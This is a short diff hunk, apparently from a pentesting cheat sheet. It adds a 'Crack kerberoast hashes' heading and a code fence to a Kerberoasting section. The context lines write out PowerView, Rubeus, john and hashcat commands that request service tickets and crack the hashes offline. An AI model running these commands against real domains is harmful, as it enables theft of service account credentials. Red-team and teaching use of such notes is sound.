@@ -193,8 +193,9 @@ Get Kerberos ticket for user with SPN
 Get-NetUser -SPN | select serviceprincipalname
 Request-SPNTicket -SPN "<serviceprincipalname>"
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-
+```
+Crack kerberoast hashes
+```powershell
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
